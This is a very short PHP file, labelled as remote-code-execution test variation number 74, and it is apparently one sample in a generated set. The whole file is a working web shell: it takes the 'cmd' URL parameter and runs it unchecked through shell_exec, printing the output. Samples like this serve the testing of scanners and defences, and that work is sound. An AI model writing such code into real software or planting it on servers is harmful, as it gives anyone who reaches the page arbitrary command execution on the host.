<?php
// RCE test variation #74
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>